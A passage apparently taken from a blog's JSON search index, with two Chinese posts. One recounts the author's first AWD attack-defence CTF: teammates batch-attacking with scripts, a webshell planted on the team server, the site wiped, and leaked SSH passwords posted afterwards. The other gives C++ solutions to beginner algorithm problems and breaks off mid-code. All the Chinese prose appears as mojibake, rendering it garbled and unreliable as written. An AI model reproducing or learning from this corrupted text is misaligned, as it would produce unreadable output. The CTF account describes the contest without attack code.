èµ›å‰å¹¶æ²¡ç”¨åšä»€ä¹ˆäº‹æƒ…ï¼Œæœ‰å¸ˆå‚…å‘äº†ä¸€ä¸‹æ¯”èµ›è§„åˆ™ï¼Œå½“æ—¶ç²—ç•¥çš„çœ‹äº†ä¸€ä¸‹ï¼Œä½†æ˜¯å¯¹äºæœ€åä¸€å¥å†—é•¿çš„è¯ä¼¼æ‡‚éæ‡‚åœ°æ è¿‡äº†ã€‚\nèµ›æ—¶ æ¯”èµ›å¼€å§‹ï¼Œç¾¤é‡Œå¸ˆå‚…å¾ˆå¿«å°±æŠŠç½‘ç«™å¤‡ä»½ç»™å‘äº†ä¸Šæ¥(å¸ˆå‚…ä»¬tql)ã€‚\nç„¶è€Œæ­¤æ—¶çš„æˆ‘è¿˜çœ‹ç€å¹³å°çš„ç•Œé¢åœ¨å‡†å¤‡è¿sshã€‚\nä½†æ˜¯ç¥å¥‡çš„æ˜¯æˆ‘sshä¸€ç›´è¿ä¸ä¸Šå»ï¼Œè‡ªé—­äº†å¥½ä¸€ä¼šï¼Œæµªè´¹äº†æŒºå¤šæ—¶é—´çš„ã€‚åæ¥å»ç¾¤é‡Œé—®äº†æ‰çŸ¥é“æ˜¯å¸ˆå‚…æŠŠsshå¯†ç ç»™æ”¹äº†ã€‚\nè¿™æ—¶å€™å¸ˆå‚…ä»¬å·²ç»ä¸æ–­åœ°å‘ä»–ä»¬å‘ç°çš„æ¼æ´äº†ã€‚\nç¨å¾®ç ”ç©¶äº†ä¸€ä¸‹ç©¶ç«Ÿè¦å¹²å˜›ï¼ŒçŸ¥é“Targetsé‡Œé¢éƒ½æ˜¯ç«¯å£ï¼Œæ˜¯æˆ‘ä»¬è¦æ”»å‡»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬sshè¿ä¸Šçš„è‡ªå·±çš„æœåŠ¡å™¨ï¼Œæ‰€æœ‰é˜Ÿä¼çš„å†…å®¹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬è¦è¿›è¡Œé˜²å®ˆï¼Œé˜²æ­¢å¯¹æ–¹å¤ºå–flagã€‚\nè¿™ä¸ªæ—¶å€™å¸ˆå‚…å·²ç»åœ¨ç¾¤é‡Œå‘ä¸€å¤§ä¸²ä¸€å¤§ä¸²çš„flagäº†ï¼Œè¿™äº›éƒ½æ˜¯å› ä¸ºå¹³å°å¡æˆ–è€…æ˜¯è„šæœ¬æäº¤å¤±è´¥è€Œæ²¡äº¤ä¸Šå»çš„ã€‚åæ­£ä»€ä¹ˆä¹Ÿä¸ä¼šï¼Œæˆ‘å°±å……å½“äº†äººè‚‰äº¤flagçš„è§’è‰²ã€‚\nå¸ˆå‚…ä»¬éƒ½æ˜¯ç›´æ¥æ‹¿è„šæœ¬æ‰¹é‡æ”»å‡»æ‹¿flagçš„tqlã€‚\næ¯”èµ›ä¹Ÿä¸ä¹æœ‰è¶£çš„äº‹æƒ…å‘ç”Ÿï¼Œæœ‰ä¸ªé˜Ÿä¼å°±æ”¾å‡ºäº† StopAttack ï¼Œæˆ–è®¸èƒ½è®©ç´§å¼ æ¯”èµ›çš„å¸ˆå‚…å¿ƒæƒ…çªç„¶å˜å¥½å§ï¼Œhhhã€‚\nåœ¨è‡ªå·±æœåŠ¡å™¨ä¸‹æµè§ˆè®¸ä¹…å‘ç°ä¼¼ä¹é™¤äº† /var/www/html é‡Œé¢æ˜¯ä¸»ç«™ åˆ«çš„ä»€ä¹ˆéƒ½æ²¡æœ‰\næ¯ä¸ªç«™éƒ½æœ‰ä¸ªä¸“é—¨çš„æµé‡æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„è®¿é—®æµé‡ï¼Œåœ¨é‡Œé¢å¯ä»¥çœ‹åˆ°å¾ˆå¤šçš„æ¶æ„æ”»å‡»ã€‚æˆ‘æƒ³æˆ‘ä»¬æ”»å‡»çš„æ—¶å€™åº”è¯¥å¯ä»¥å€Ÿé‰´ä¸€ä¸‹å…¶ä»–æ”»å‡»è€…çš„æ”»å‡»æ–¹å¼ï¼Œä»è€Œè¿›è¡Œæ”»å‡»ã€‚\næ¯”èµ›æ¥è¿‘å°¾å£°ï¼Œæˆ‘åœ¨çœ‹æŸä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹çš„æ—¶å€™æƒ³åˆ°å·±æ–¹çš„æœåŠ¡å™¨å¯èƒ½è¢«å¯¹æ–¹ä¸Šäº†ğŸï¼Œçœ‹äº†ä¸€ä¸‹æœç„¶æ˜¯ã€‚\nè¿™æ—¶å€™äº§ç”Ÿäº†ä¸€ä¸ªæƒ³æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥ç›‘æ§è¿™ä¸ªåœ°å€ï¼Œåªè¦æœ‰æ–‡ä»¶ä¼ ä¸Šæ¥å°±ç«‹åˆ»åˆ æ‰ã€‚\næ­£åœ¨æˆ‘å‡†å¤‡åˆ æ‰è¿™ä¸ªçš„æ—¶å€™ï¼Œä¸‹ä¸€ç§’ï¼Œå¦ä¸€ä¸ªå¸ˆå‚…å°±å‘ç°æˆ‘ä»¬è¢«åˆ ç«™äº†ã€‚ã€‚ã€‚ã€‚ã€‚\nå†ç„¶åï¼Œæ¯”èµ›å°±ç»“æŸäº†ã€‚\nèµ›å æ¯”èµ›ç»“æŸæœ‰å¸ˆå‚…ç›´æ¥åœ¨æ¯”èµ›å¤§ç¾¤é‡Œå‘è·å–çš„ä¸€å¤§ä¸²sshå¯†ç ï¼Œå¹¶ç›´æ¥ä¸Šå·åˆ ç«™çš„æ“ä½œã€‚ ï¼ˆæˆ‘äº¬äº†ï¼ï¼‰\nåæ¥å»ç¾¤é‡Œé—®è‡ªå·±å¸ˆå‚…æ˜¯ä¸æ˜¯ä¸€å¼€å§‹ç›´æ¥æ”¹sshå¯†ç å¯ä»¥é¿å…è¿™ç§äº‹æƒ…å‘ç”Ÿï¼Œè¢«å¸ˆå‚…æ‰¹è¯„è¯´æ²¡çœ‹æ¯”èµ›è¯´æ˜äº†ã€‚ï¼ˆä½†æ˜¯æƒ³äº†æƒ³ï¼Œæ— è®ºå¦‚ä½•ï¼Œæ”¹sshå¯†ç ç¡®å®æ˜¯å¯ä»¥å³ä¾¿åœ¨cookieæ³„éœ²çš„æƒ…å†µä¸‹ä¹Ÿèƒ½é˜²æ­¢è¢«åˆ ç«™/è¢«ç™»å½•çš„æ‰‹æ®µï¼Œæˆ–è®¸ä»¥åå¯ä»¥å€Ÿé‰´ä¸€ä¸‹ï¼Œå…»æˆæ”¹å¯†ç çš„ä¹ æƒ¯ï¼Œè¯´å¥½å¬ç‚¹å«å®‰å…¨æ„è¯†å§ï¼‰\nå†çœ‹äº†ä¸€çœ¼æ³¨æ„äº‹é¡¹ï¼Œçªç„¶å“åˆ°äº†è‡ªå·±ã€‚ã€‚ã€‚ã€‚\nï¼ˆè™½ç„¶æˆ‘åªåœ¨åŒä¸€ä¸ªæµè§ˆå™¨é‡Œçœ‹äº†ä¸€ä¸ªå¯¹é¢çš„web3 ä½†æ˜¯ç¡®å®æœ‰å¯èƒ½æ˜¯æˆ‘æ³„éœ²äº†cookieï¼‰\nè¿™æ˜¯äº§ç”Ÿæ³„éœ²çš„åŸå› (åæ¥åœ¨æ˜Ÿç›ŸæŸä¸ªç›´æ’­ä¸­çœ‹åˆ°çš„æŒºå¥½çš„å°±æˆªä¸‹å›¾äº†)\nå®³ï¼Œæ˜¯çœŸçš„æ²¡æœ‰æƒ³åˆ°å±…ç„¶è¿˜æœ‰è¿™ç§éªšæ“ä½œï¼ŒçœŸçš„æ˜¯å­¦ä¹ çš„è·¯è¿˜å¾ˆé•¿å•Šã€‚\næ€»ç»“ æ€»ç»“äº†ä¸€ä¸‹\nAWDçš„ç‰¹ç‚¹æ˜¯ä¸»è¦æ¼æ´å¯èƒ½æ²¡æœ‰å¹³å¸¸è§£é¢˜ç±»é¢˜ç›®çš„éš¾åº¦å¤§\nä¸»è¦æ˜¯å‘ç°æ¼æ´å’Œä¿®å¤æ¼æ´çš„èƒ½åŠ›ï¼Œå®¡è®¡æµé‡çš„èƒ½åŠ›ï¼Œæ”»å‡»çš„èƒ½åŠ›ä»¥åŠååº”é€Ÿåº¦ç­‰ç­‰\nå½“ç„¶äº† åˆ©ç”¨CVEçš„æ˜¯æ›´é«˜ä¸€å±‚æ¬¡çš„å¢ƒç•Œäº†ã€‚ï¼ˆæˆ‘tclï¼‰\næ— è®ºå¦‚ä½•ï¼Œè„šæœ¬æ˜¯ä¸€ç›´å›´ç»•AWDçš„é‡ç‚¹ï¼Œæ‰€ä»¥ç¡®å®šäº†ä¸€ä¸‹æ¥ä¸‹æ¥çš„å­¦ä¹ ç›®æ ‡ï¼šå¢åŠ è„šæœ¬çš„ç¼–å†™èƒ½åŠ›ã€‚\n","description":"","id":35,"section":"posts","tags":["CTF","AWD"],"title":"è®°äººç”Ÿç¬¬ä¸€æ¬¡AWD","uri":"https://ruokeqx.gitee.io/posts/my_first_awd/"},{"content":"æ€»ç»“ï¼šå­¦è¿‡ç®—æ³•çš„å¯ä»¥æ°´å­¦åˆ† æ²¡å­¦è¿‡çš„ä¸å¤ªå¥½æ°´é«˜åˆ† ä¸€èˆ¬cè¯­è¨€å­¦äº†70-80åˆ†æ²¡é—®é¢˜ ä½†æ˜¯90-100æœ‰éš¾åº¦ è‡ªè¡Œæ–Ÿé…Œ\né—®é¢˜ A: èµŒå¾’ é¢˜ç›®æè¿° æœ‰nä¸ªèµŒå¾’æ‰“ç®—èµŒä¸€å±€ã€‚è§„åˆ™æ˜¯ï¼š\næ¯äººä¸‹ä¸€ä¸ªèµŒæ³¨ï¼ŒèµŒæ³¨ä¸ºéè´Ÿæ•´æ•°ï¼Œä¸”ä»»æ„ä¸¤ä¸ªèµŒæ³¨éƒ½ä¸ç›¸åŒã€‚èƒœè€…ä¸ºèµŒæ³¨æ°å¥½æ˜¯å…¶ä½™ä»»æ„ä¸‰ä¸ªäººçš„èµŒæ³¨ä¹‹å’Œçš„é‚£ä¸ªäººã€‚å¦‚æœæœ‰å¤šä¸ªèƒœè€…ï¼Œæˆ‘ä»¬å–èµŒæ³¨æœ€å¤§çš„é‚£ä¸ªä¸ºæœ€ç»ˆèƒœè€…ã€‚\nä¾‹å¦‚ï¼ŒAï¼ŒBï¼ŒCï¼ŒDï¼ŒEåˆ†åˆ«ä¸‹èµŒæ³¨ä¸º2ã€3ã€5ã€7ã€12ï¼Œæœ€ç»ˆèƒœè€…æ˜¯Eï¼Œå› ä¸º12=2+3+7ã€‚\nè¾“å…¥ è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„é¦–å…ˆè¾“å…¥ä¸€ä¸ªæ•´æ•°nï¼ˆ1\u0026lt;=n\u0026lt;=1000ï¼‰ï¼Œè¡¨ç¤ºèµŒå¾’çš„ä¸ªæ•°ã€‚\næ¥ä¸‹æ¥nè¡Œæ¯è¡Œè¾“å…¥ä¸€ä¸ªéè´Ÿæ•´æ•°bï¼ˆ0\u0026lt;=b\u0026lt;32768ï¼‰ï¼Œè¡¨ç¤ºæ¯ä¸ªèµŒå¾’ä¸‹çš„èµŒæ³¨ã€‚\nå½“n=0æ—¶ï¼Œè¾“å…¥ç»“æŸã€‚\nè¾“å‡º å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºæœ€ç»ˆèƒœè€…çš„èµŒæ³¨ï¼Œå¦‚æœæ²¡æœ‰èƒœè€…ï¼Œåˆ™è¾“å‡ºno solutionã€‚\nç®€å•æ€è·¯ ç›´æ¥æš´åŠ› ä½†æ˜¯æˆ‘æ€»è§‰å¾—æ•°æ®ç¨å¾®å¤§ç‚¹è¿™é¢˜ç»å¯¹ä¸èƒ½è¿™ä¹ˆåš\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstdio\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;queue\u0026gt; #include\u0026lt;cstring\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; bool cmp(int a,int b){ return a\u0026gt;b; } int main(){ int n; int a[1111]; while(cin\u0026gt;\u0026gt;n \u0026amp;\u0026amp; n){ for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;a[i]; sort(a+1,a+1+n,cmp); int flag=0; for(int t=1;t\u0026lt;=n;t++){ for(int i=t+1;i\u0026lt;=n;i++){ for(int j=i+1;j\u0026lt;=n;j++){ for(int k=j+1;k\u0026lt;=n;k++){ if(a[i]+a[j]+a[k]==a[t]){ cout\u0026lt;\u0026lt;a[t]\u0026lt;\u0026lt;endl; flag=1; break; } } if(flag) break; } if(flag) break; } if(flag) break; } if(!flag) cout\u0026lt;\u0026lt;\u0026#34;no solution\\n\u0026#34;; } return 0; } é—®é¢˜ B: ASCIIç  é¢˜ç›®æè¿° ç›¸ä¿¡å¤§å®¶ä¸€å®šéƒ½çŸ¥é“å¤§åé¼é¼çš„ASCIIç ï¼Œè¿™æ¬¡ç»™ä½ çš„ä»»åŠ¡æ˜¯è¾“å…¥æ•°å­—ï¼ˆè¡¨ç¤ºASCIIç ï¼‰ï¼Œè¾“å‡ºç›¸å¯¹åº”çš„å­—ç¬¦ä¿¡æ¯ã€‚\nè¾“å…¥ ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°Tï¼ˆ1\u0026lt;=T\u0026lt;=1000ï¼‰ã€‚\næ¥ä¸‹æ¥åŒ…æ‹¬Tä¸ªæ­£æ•´æ•°ï¼Œç”±ç©ºç™½ç¬¦åˆ†å‰²ã€‚ï¼ˆç©ºç™½ç¬¦åŒ…æ‹¬ç©ºæ ¼ã€æ¢è¡Œã€åˆ¶è¡¨ç¬¦ï¼‰\nè¿™äº›æ•´æ•°ä¸ä¼šå°äº32ã€‚\nè¾“å‡º åœ¨ä¸€è¡Œå†…è¾“å‡ºç›¸åº”çš„å­—ç¬¦ä¿¡æ¯ã€‚ï¼ˆæ³¨æ„ä¸è¦è¾“å‡ºä»»ä½•å¤šä½™çš„å­—ç¬¦ï¼‰\nç®€å•æ€è·¯ ç›´æ¥å¼ºè½¬å°±è¡Œäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstdio\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;queue\u0026gt; #include\u0026lt;cstring\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; int main(){ int t; while(cin\u0026gt;\u0026gt;t){ while(t--){ int a; cin\u0026gt;\u0026gt;a; cout\u0026lt;\u0026lt;(char)a; } cout\u0026lt;\u0026lt;endl; } system(\u0026#34;pause\u0026#34;); return 0; } é—®é¢˜ C: æœŸæœ«æˆç»© é¢˜ç›®æè¿° åˆåˆ°å­¦æœŸæœ«ï¼Œå°æ˜è¿æ¥äº†åˆä¸€æ¬¡çš„æœŸæœ«è€ƒè¯•ã€‚è™½ç„¶æ¯å­¦æœŸéƒ½è¦è€ƒè¯•ï¼Œä½†æ˜¯è¿™æ¬¡æœŸæœ«è€ƒè¯•å¯¹å°æ˜æ¥è¯´æ„ä¹‰é‡å¤§ã€‚å› ä¸ºå°æ˜çˆ±æ…•å·²ä¹…çš„å¥³ç¥è¯´ï¼Œå¦‚æœå°æ˜è¿™æ¬¡è€ƒäº†å…¨ç­å‰ä¸‰åå°±åšä»–å¥³æœ‹å‹ã€‚è™½è¯´å°æ˜æ²¡æœ‰åè¶³çš„ä¿¡å¿ƒï¼Œä½†æ˜¯å¥³ç¥çš„è¯ä¸èƒ½ä¸å¬å•Šã€‚\nè€ƒå®Œè¯•åï¼Œå°æ˜æ‹¿åˆ°äº†å…¨ç­çš„æˆç»©å•ï¼Œè¿™å¼ æˆç»©å•æ˜¯æŒ‰å­¦å·é¡ºåºæ’å¥½çš„ã€‚å°æ˜å¾ˆæƒ³çŸ¥é“ç­é‡Œåˆ°åº•æœ‰å¤šå°‘äººåˆ†æ•°æ¯”ä»–é«˜ï¼Œç°åœ¨å°±è¯·ä½ å¸®å¸®ä»–ï¼Œå¸®ä»–æ•°ä¸€ä¸‹åˆ°åº•æœ‰å¤šå°‘äººçš„åˆ†æ•°æ¯”ä»–é«˜å§ã€‚\nè¾“å…¥ è¾“å…¥æ•°æ®çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ­£æ•´æ•°Tï¼Œè¡¨ç¤ºæµ‹è¯•æ•°æ®çš„ç»„æ•°ï¼Œæ¥ä¸‹æ¥æœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚\næ¯ç»„æ•°æ®åŒ…æ‹¬ä¸¤è¡Œã€‚\nç¬¬ä¸€è¡Œæœ‰ä¸¤ä¸ªæ­£æ•´æ•°Nï¼ŒKï¼ˆ0\u0026lt;N\u0026lt;1000ï¼Œ0\u0026lt;K\u0026lt;=Nï¼‰,åˆ†åˆ«è¡¨ç¤ºæˆç»©å•ä¸Šæ€»å…±çš„å­¦ç”Ÿæ•°ç›®ï¼Œå’Œå°æ˜çš„å­¦å·ã€‚\nç¬¬äºŒè¡Œæœ‰Nä¸ªæ•´æ•°Xiï¼ˆ0\u0026lt;=Xi\u0026lt;=100ï¼‰åˆ†åˆ«è¡¨ç¤ºå„ä¸ªå­¦ç”Ÿçš„æˆç»©ï¼Œä»¥å­¦å·é€’å¢é¡ºåºç»™å‡ºï¼Œç¬¬ä¸€ä¸ªå­¦ç”Ÿå­¦å·ä¸º1ã€‚\nè¾“å‡º å¯¹äºæ¯ç»„æ•°æ®ï¼Œè¯·åœ¨ä¸€è¡Œé‡Œè¾“å‡ºç­é‡Œä¸€å…±æœ‰å¤šå°‘ä¸ªå­¦ç”Ÿæˆç»©é«˜äºå°æ˜ã€‚\næ ·ä¾‹è¾“å…¥ 1\n3 2\n81 72 63\næ ·ä¾‹è¾“å‡º 1\nç®€å•æ€è·¯ forå†éä¸€ä¸‹å°±å¯ä»¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstdio\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;queue\u0026gt; #include\u0026lt;cstring\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; int main(){ int t; int n,k; while(cin\u0026gt;\u0026gt;t){ while(t--){ int a[2000]={0}; memset(a,0,sizeof(a)); cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;k; for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;a[i]; int t=a[k]; int count=0; for(int i=1;i\u0026lt;=n;i++) if(a[i]\u0026gt;t) count++; cout\u0026lt;\u0026lt;count\u0026lt;\u0026lt;endl; } } return 0; } é—®é¢˜ D: ã€åŸºç¡€é¢˜ã€‘å°½å¯èƒ½å¤§çš„ä¸‰ä½æ•° é¢˜ç›®æè¿° è¾“å…¥ä¸€ä¸ªä¸‰ä½æ•°çš„æ­£æ•´æ•°ï¼Œå°†æ•°å­—ä½ç½®é‡æ–°æ’åˆ—ï¼Œç»„æˆä¸€ä¸ªå°½å¯å¤§çš„ä¸‰ä½æ•°ã€‚ä¾‹å¦‚ï¼šè¾“å…¥213ï¼Œé‡æ–°æ’åˆ—å¯å¾—åˆ°å°½å¯èƒ½å¤§çš„ä¸‰ä½æ•°æ˜¯321ã€‚\nè¾“å…¥ ä¸‰ä½æ•°çš„æ­£æ•´æ•°ã€‚\nè¾“å‡º é‡æ’åå°½å¯èƒ½å¤§çš„ä¸‰ä½æ•°ã€‚\næ ·ä¾‹è¾“å…¥ 213\næ ·ä¾‹è¾“å‡º 321\nç®€å•æ€è·¯ sortä¸€ä¸‹å°±è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstdio\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;queue\u0026gt; #include\u0026lt;cstring\u0026gt; #include\u0026lt;algorithm\u0026gt; #include\u0026lt;set\u0026gt; using namespace std; bool cmp(char a,char b){ return a\u0026gt;b; } int main(){ char a[10]; while(cin\u0026gt;\u0026gt;a[0]\u0026gt;\u0026gt;a[1]\u0026gt;\u0026gt;a[2]){ sort(a,a+3,cmp); cout\u0026lt;\u0026lt;a[0]\u0026lt;\u0026lt;a[1]\u0026lt;\u0026lt;a[2]\u0026lt;\u0026lt;endl; } return 0; } é—®é¢˜ E: ä¼šåœºå®‰æ’é—®é¢˜ é¢˜ç›®æè¿° å‡è®¾è¦åœ¨è¶³å¤Ÿå¤šçš„ä¼šåœºé‡Œå®‰æ’ä¸€æ‰¹æ´»åŠ¨ï¼Œå¹¶å¸Œæœ›ä½¿ç”¨å°½å¯èƒ½å°‘çš„ä¼šåœºã€‚è®¾è®¡ä¸€ä¸ªæœ‰æ•ˆçš„\nè´ªå¿ƒç®—æ³•è¿›è¡Œå®‰æ’ã€‚(è¿™ä¸ªé—®é¢˜å®é™…ä¸Šæ˜¯è‘—åçš„å›¾ç€è‰²é—®é¢˜ã€‚è‹¥å°†æ¯ä¸€ä¸ªæ´»åŠ¨ä½œä¸ºå›¾çš„ä¸€ä¸ª\né¡¶ç‚¹ï¼Œä¸ç›¸å®¹æ´»åŠ¨é—´ç”¨è¾¹ç›¸è¿ã€‚ä½¿ç›¸é‚»é¡¶ç‚¹ç€æœ‰ä¸åŒé¢œè‰²çš„æœ€å°ç€è‰²æ•°ï¼Œç›¸åº”äºè¦æ‰¾çš„æœ€å°\nä¼šåœºæ•°ã€‚)\nç¼–ç¨‹ä»»åŠ¡ï¼š å¯¹äºç»™å®šçš„ k ä¸ªå¾…å®‰æ’çš„æ´»åŠ¨ï¼Œç¼–ç¨‹è®¡ç®—ä½¿ç”¨æœ€å°‘ä¼šåœºçš„æ—¶é—´è¡¨ã€‚\nè¾“å…¥ ç¬¬ä¸€è¡Œæœ‰ 1 ä¸ªæ­£æ•´æ•° kï¼Œè¡¨ç¤ºæœ‰ k ä¸ªå¾…å®‰æ’çš„æ´»åŠ¨ã€‚æ¥\nä¸‹æ¥çš„ k è¡Œä¸­ï¼Œæ¯è¡Œæœ‰ 2 ä¸ªæ­£æ•´æ•°ï¼Œåˆ†åˆ«è¡¨ç¤º k ä¸ªå¾…å®‰æ’çš„æ´»åŠ¨å¼€å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ã€‚æ—¶é—´\nä»¥ 0 ç‚¹å¼€å§‹çš„åˆ†é’Ÿè®¡ã€‚\nè¾“å‡º å°†ç¼–ç¨‹è®¡ç®—å‡ºçš„æœ€å°‘ä¼šåœºæ•°è¾“å‡º\næ ·ä¾‹è¾“å…¥ 5 1 23 12 28 25 35 27 80 36 50\næ ·ä¾‹è¾“å‡º 3\næç¤º k\u0026lt;10000\nç®€å•æ€è·¯ beginæ’åº endå°äº†å°±å¼€ä¸€ä¸ªä¼šåœº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstdio\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;queue\u0026gt; #include\u0026lt;cstring\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; int s[11111],e[11111]; int main(){ int n=0,i=0,j=0,k=0; cin\u0026gt;\u0026gt;n; for(;i\u0026lt;n;i++) cin\u0026gt;\u0026gt;s[i]\u0026gt;\u0026gt;e[i]; sort(s,s+n); sort(e,e+n); for(i=0;i\u0026lt;n;i++) { if(s[i]\u0026lt;e[j]) k++; else j++; } cout\u0026lt;\u0026lt;k\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); return 0; } é—®é¢˜ F: é£ç¿” é¢˜ç›®æè¿° é¹°æœ€éª„å‚²çš„å°±æ˜¯ç¿±ç¿”ï¼Œä½†æ˜¯é¹°ä»¬äº’ç›¸éƒ½å¾ˆå«‰å¦’åˆ«çš„é¹°æ¯”è‡ªå·±é£çš„å¿«ï¼Œæ›´å«‰å¦’å…¶ä»–çš„é¹°æ¯”è‡ªå·±é£è¡Œçš„æœ‰æŠ€å·§ã€‚äºæ˜¯ï¼Œä»–ä»¬å†³å®šä¸¾åŠä¸€åœºæ¯”èµ›ï¼Œæ¯”èµ›çš„åœ°æ–¹å°†åœ¨ä¸€ä¸ªè¿·å®«ä¹‹ä¸­ã€‚\nè¿™äº›é¹°çš„èµ·å§‹ç‚¹è¢«è®¾åœ¨ä¸€ä¸ªN*MçŸ©é˜µçš„å·¦ä¸‹è§’map[1ï¼Œ1]çš„å·¦ä¸‹è§’ã€‚ç»ˆç‚¹è¢«è®¾å®šåœ¨çŸ©é˜µçš„å³ä¸Šè§’map[N,M]çš„å³ä¸Šè§’ï¼Œæœ‰äº›map[i,j]æ˜¯å¯ä»¥ä»ä¸­é—´ç©¿è¶Šçš„ã€‚æ¯ä¸€ä¸ªæ–¹æ ¼çš„è¾¹é•¿éƒ½æ˜¯100ç±³ã€‚å¦‚å›¾æ‰€ç¤ºï¼š\næ²¡æœ‰éšœç¢ï¼Œä¹Ÿæ²¡æœ‰æ­»è·¯ã€‚è¿™æ ·è®¾è®¡ä¸»è¦æ˜¯ä¸ºäº†é«˜é€Ÿé£è¡Œçš„é¹°ä»¬ä¸è¦å‘ç°æ­»è·¯æ¥ä¸åŠè°ƒæ•´è€Œå‘ç”Ÿæ„å¤–ã€‚æ½˜å¸•æ–¯é›„é¹°å†’ç€å‡RPçš„å±é™©ä»æ¯”èµ›æ‰¿åŠæ–¹æˆ’å¤‡æ£®ä¸¥çš„åŸºåœ°ä¸­å· æ¥äº†æ–½å·¥çš„åœ°å›¾ã€‚ä½†æ˜¯é—®é¢˜ä¹Ÿéšä¹‹è€Œæ¥ï¼Œä»–å¿…é¡»åœ¨æ¯”èµ›å¼€å§‹ä¹‹å‰æŠŠåœ°å›¾çš„æ¯ä¸€æ¡è·¯éƒ½ææ¸…æ¥šï¼Œä»ä¸­æ‰¾åˆ°ä¸€æ¡åˆ°è¾¾ç»ˆç‚¹æœ€è¿‘çš„è·¯ã€‚ï¼ˆå“ˆå“ˆï¼Œç¬¨é¸Ÿä¸å…ˆé£ä¹Ÿè¦æ‹¿å† å†›ï¼‰ä½† æ˜¯æ­¤é¹°æ˜¯å‰æ— å¤é¹°ï¼Œåæ— æ¥é¹°çš„åƒèœé•¿å¤§çš„é¹°\u0026ndash;èœé¸Ÿã€‚ä»–è‡ªå·±æ²¡æœ‰åŠæ³•å¾—å‡ºæœ€çŸ­çš„è·¯å¾„ï¼Œäºæ˜¯ç´§æ€¥ä¹‹ä¸‹æ‰¾åˆ°äº†å­¦OIçš„ä½ ï¼Œå¸Œæœ›æ‰¾åˆ°ä½ çš„å¸®åŠ©ã€‚\nè¾“å…¥ é¦–è¡Œä¸ºn,m(0\u0026lt;n,m\u0026lt;=1000000),ç¬¬2è¡Œä¸ºkï¼ˆ0\u0026lt;k\u0026lt;=1000ï¼‰è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªç‰¹æ®Šçš„è¾¹ã€‚ä»¥ä¸‹kè¡Œä¸ºä¸¤ä¸ªæ•°ï¼Œi,jè¡¨ç¤ºmap[i,j]æ˜¯å¯ä»¥ç›´æ¥ç©¿è¶Šçš„ã€‚\nè¾“å‡º ä»…ä¸€è¡Œï¼Œ1ï¼Œ1\u0026ndash;\u0026gt;n,mçš„æœ€çŸ­è·¯å¾„çš„é•¿åº¦ï¼Œå››èˆäº”å…¥ä¿ç•™åˆ°æ•´æ•°å³å¯\næ ·ä¾‹è¾“å…¥ 3 2\n3\n1 1\n3 2\n1 2\næ ·ä¾‹è¾“å‡º 383\nç®€å•æ€è·¯ æ‰¾æœ€é•¿ä¸Šå‡çš„æ•°é‡ å³èµ°æ–œçº¿çš„æ•°é‡\nç„¶åå°±æ˜¯æ‰¾ä¸Šå‡ä¸ªæ•°å’Œé•¿åº¦çš„è§„å¾‹(å…¶å®ä¸€ç›®äº†ç„¶) 4èˆ5å…¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 //n,må°çš„è¯å¯ä»¥dfs ä½†æ˜¯è¿™ä¸ªå¤ªå¤§äº†ã€‚ã€‚ã€‚ //å…¶å®ç®—å‡ºä¸Šå‡æ•°é‡å°±è¡Œäº† #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstdio\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;queue\u0026gt; #include\u0026lt;cstring\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; struct N{ int x; int y; }; N node[1111]; int dp[1111]; bool cmp(N a, N b){ return a.x\u0026lt;b.x; } int main(){ int n,m,k; while(cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m\u0026gt;\u0026gt;k){ memset(dp,0,sizeof(dp)); for(int i=0;i\u0026lt;k;i++) cin\u0026gt;\u0026gt;node[i].x\u0026gt;\u0026gt;node[i].y; sort(node,node+k,cmp); int maxn = 0; for(int i=0;i\u0026lt;k;i++){ dp[i]=1; for(int j=0;j\u0026lt;i;j++) if(node[i].x \u0026gt; node[j].x \u0026amp;\u0026amp; node[i].y \u0026gt; node[j].y \u0026amp;\u0026amp; dp[i] \u0026lt; dp[j]+1) dp[i] = dp[j]+1; if(dp[i] \u0026gt; maxn) maxn = dp[i]; } double 